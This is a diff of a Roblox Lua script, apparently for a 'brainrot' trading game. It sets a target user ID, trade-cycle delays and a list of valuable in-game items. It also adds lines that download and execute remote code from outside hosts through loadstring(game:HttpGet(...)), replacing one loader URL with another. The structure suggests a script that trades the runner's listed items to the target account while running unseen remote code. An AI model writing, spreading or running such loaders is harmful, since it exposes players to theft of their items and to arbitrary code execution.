@@ -3,6 +3,12 @@ getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Headless Horseman"] = true,
@@ -46,19 +52,16 @@ getgenv().TARGET_BRAINROTS = {
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
     ["Jolly Jolly Sahur"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
     ["Tirilikalika Tirilikalako"] = true,
-    ["Swaggy Bros"] = true,
-    ["Chillin Chili"] = true,
+    ["Dug dug dug"] = true,
     ["Los Chillis"] = true,
-    ["Digi Narwhal"] = true,
-    ["Kalika Bros"] = true,
-    ["Gym Bros"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["Centrucci Nuclucci"] = true,
+    ["Chillin Chili"] = true,
     ["Fragola La La La"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7"))()
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/4412bf5b03484439b54771aa1b89e7bf8dd52b12759ac2f76d92f6e759c3e333/download"))()
